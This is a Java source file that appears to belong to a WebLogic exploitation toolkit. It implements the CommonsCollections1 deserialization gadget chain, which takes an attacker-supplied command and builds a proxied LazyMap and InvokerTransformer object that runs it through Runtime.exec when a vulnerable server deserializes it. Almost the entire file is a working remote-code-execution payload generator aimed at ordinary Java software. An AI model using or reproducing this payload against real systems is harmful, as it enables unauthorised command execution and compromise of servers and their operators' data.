package com.weblogic.framework.gadget.impl;

import com.weblogic.framework.annotation.Authors;
import com.weblogic.framework.annotation.Dependencies;
import com.weblogic.framework.gadget.ObjectPayload;
import com.weblogic.framework.utils.Gadgets;
import com.weblogic.framework.utils.ReflectionUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.InvocationHandler;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

/**
 * Title: CommonsCollections1Gadget
 * Desc: CommonsCollections1 Gadget
 * Gadget chain:
 *     ObjectInputStream.readObject()
 *         AnnotationInvocationHandler.readObject()
 *             Map(Proxy).entrySet()
 *                 AnnotationInvocationHandler.invoke()
 *                     LazyMap.get()
 *                         ChainedTransformer.transform()
 *                             ConstantTransformer.transform()
 *                             InvokerTransformer.transform()
 *                                 Method.invoke()
 *                                     Class.getMethod()
 *                             InvokerTransformer.transform()
 *                                 Method.invoke()
 *                                     Runtime.getRuntime()
 *                             InvokerTransformer.transform()
 *                                 Method.invoke()
 *                                     Runtime.exec()
 * Requires:
 *     commons-collections
 * Date: 2020/4/8 22:57
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections1Gadget implements ObjectPayload {

    @Override
    public Object getObject(String command, URLClassLoader urlClassLoader) throws Exception {
        final String[] execArgs = new String[] { command };
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
        // arm with actual transformer chain
        ReflectionUtils.setFieldValue(transformerChain, "iTransformers", transformers);
        return handler;
    }

    @Override
    public Object getObject(byte[] codeByte, String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
        return null;
    }
}
